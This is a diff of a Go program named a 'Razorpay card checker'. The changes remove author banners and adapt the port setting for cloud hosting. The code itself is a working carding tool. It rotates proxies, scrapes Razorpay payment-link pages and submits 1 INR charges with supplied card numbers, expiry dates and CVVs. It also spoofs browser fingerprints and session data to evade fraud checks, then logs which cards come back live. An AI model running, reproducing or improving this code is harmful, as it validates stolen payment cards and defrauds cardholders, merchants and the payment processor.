@@ -1,7 +1,3 @@
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 package main
 
 import (
@@ -27,14 +23,9 @@ import (
     "time"
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 const (
     BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
     BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
-    PORT     = 7070
 )
 
 var (
@@ -45,18 +36,10 @@ var (
     proxyIndex uint64
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func getNextURL() string {
     idx := atomic.AddUint64(&urlIndex, 1) - 1
     return razorpayURLs[idx%uint64(len(razorpayURLs))]
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func formatProxy(raw string) string {
     raw = strings.TrimSpace(raw)
@@ -100,10 +83,6 @@ func getNextProxy(proxyList []string) string {
     idx := atomic.AddUint64(&proxyIndex, 1) - 1
     return proxyList[idx%uint64(len(proxyList))]
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func randInt(min, max int) int {
     n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
@@ -162,9 +141,6 @@ func findBetween(content, start, end string) string {
     return content[si : si+ei]
 }
 
-// extractJSONVar uses brace counting instead of regex — Go's RE2 does NOT
-// backtrack like PHP's PCRE, so `[\s\S]*?` stops at the first `}` (which is
-// inside a nested object), producing truncated/corrupt JSON.
 func extractJSONVar(content, varName string) string {
     prefix := "var " + varName + " ="
     startIdx := strings.Index(content, prefix)
@@ -173,7 +149,6 @@ func extractJSONVar(content, varName string) string {
     }
     startIdx += len(prefix)
 
-    // skip whitespace
     for startIdx < len(content) {
         c := content[startIdx]
         if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
@@ -239,10 +214,6 @@ func generateRzpSessionID() string {
     }
     return string(buf)
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 type FetchResponse struct {
     Body       string
@@ -356,11 +327,7 @@ func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payl
         headers = make(map[string]string)
     }
     if _, ok := headers["Content-Type"]; !ok {
-        if _, ok2 := headers["Content-type"]; !ok2 {
-            if _, ok3 := headers["content-type"]; !ok3 {
-                headers["Content-Type"] = "application/json"
-            }
-        }
+        headers["Content-Type"] = "application/json"
     }
     return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
 }
@@ -370,18 +337,10 @@ func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, form
         headers = make(map[string]string)
     }
     if _, ok := headers["Content-Type"]; !ok {
-        if _, ok2 := headers["Content-type"]; !ok2 {
-            if _, ok3 := headers["content-type"]; !ok3 {
-                headers["Content-Type"] = "application/x-www-form-urlencoded"
-            }
-        }
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
     }
     return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 type CheckResult struct {
     Status      string `json:"status"`
@@ -389,10 +348,6 @@ type CheckResult struct {
     Proxy       string `json:"proxy"`
     ProxyStatus string `json:"proxy_status"`
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     yy2 := yy
@@ -415,10 +370,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
     defer fetch.client.CloseIdleConnections()
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
     r1, err := fetch.Get(targetURL, map[string]string{
         "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
@@ -428,7 +379,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
     r1Text := r1.Text()
 
-    // Use brace-counting parser instead of regex
     jsonStr := extractJSONVar(r1Text, "data")
     if jsonStr == "" {
         return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
@@ -455,7 +405,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     var plink, ppid string
-    // Force 1 INR (100 paise) — never use 0 from potentially missing JSON fields
     const forceAmount float64 = 100
 
     if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
@@ -480,10 +429,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
     keylessHeader := getStringFromMap(initData, "keyless_header")
     keylessHeaderURL := url.QueryEscape(keylessHeader)
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
     r2Payload := map[string]interface{}{
         "notes":      map[string]string{"comment": "", "name": "User"},
@@ -536,10 +481,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         orderCurrency = "INR"
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
     params3 := url.Values{
         "traffic_env":        {"production"},
         "build":              {BUILD},
@@ -587,10 +528,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Preferences request
     {
         resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
         queryArr := make([]map[string]string, 0, len(resources))
@@ -625,10 +563,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Order submission
     {
         form5 := url.Values{
             "notes[email]":          {email},
@@ -669,10 +604,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Cross border flows
     {
         r6Payload := map[string]interface{}{
             "identifiers": map[string]interface{}{
@@ -695,10 +627,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
             h, r6Payload,
         )
     }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
     tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
@@ -781,15 +709,12 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
     pidClean := paymentID
     if idx := strings.Index(paymentID, "_"); idx != -1 {
         pidClean = paymentID[idx+1:]
     }
 
+    // Auth step
     {
         fetch.PostForm(
             fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
@@ -800,6 +725,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
     time.Sleep(1 * time.Second)
 
+    // Browser fingerprint
     {
         screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
         screen := screens[randInt(0, len(screens)-1)]
@@ -823,10 +749,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
             form8,
         )
     }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
     r9, err := fetch.Get(
         fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
@@ -873,10 +795,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
 
     return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func getStringFromMap(m map[string]interface{}, key string) string {
     if m == nil {
@@ -988,10 +906,6 @@ func maskProxy(proxyURL, proxyStatus string) string {
     return masked + " [" + proxyStatus + "]"
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 type ParsedCard struct {
     CC, MM, YY, CVV string
 }
@@ -1045,10 +959,6 @@ func isDigitsCVV(s string) bool {
     return isDigits(s) && (len(s) == 3 || len(s) == 4)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func logLive(card *ParsedCard, result CheckResult) {
     if result.Status == "charged" || result.Status == "approved" {
         line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
@@ -1078,10 +988,6 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
         strings.ToUpper(result.Status), first6, middle, last4,
         result.Message, proxyDisplay, targetURL)
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func handler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
@@ -1136,16 +1042,18 @@ func handler(w http.ResponseWriter, r *http.Request) {
     json.NewEncoder(w).Encode(resp)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 func main() {
     log.SetFlags(log.Ldate | log.Ltime)
 
     http.HandleFunc("/", handler)
 
-    addr := fmt.Sprintf("0.0.0.0:%d", PORT)
+    // Get port from environment variable (Render sets this automatically)
+    port := os.Getenv("PORT")
+    if port == "" {
+        port = "7070" // Default for local testing
+    }
+    addr := "0.0.0.0:" + port
+
     log.Printf("=========================================================")
     log.Printf("  RAZORPAY CARD CHECKER - GO VERSION")
     log.Printf("  Listening on: http://%s", addr)
@@ -1156,8 +1064,3 @@ func main() {
         log.Fatalf("Server failed: %v", err)
     }
 }
-
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
